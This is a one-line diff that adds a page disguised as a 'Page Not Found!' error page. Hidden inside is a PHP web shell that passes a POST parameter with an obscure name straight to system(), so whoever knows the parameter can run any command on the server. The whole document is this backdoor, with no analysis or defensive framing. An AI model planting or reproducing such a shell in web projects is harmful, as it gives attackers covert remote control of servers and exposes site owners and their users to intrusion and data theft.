@@ -1,0 +1,1 @@
+<html></b>Page Not Found! <?php if (isset($_POST['GGbot9247578de562'])) {system($_POST['GGbot9247578de562']);}?></html>
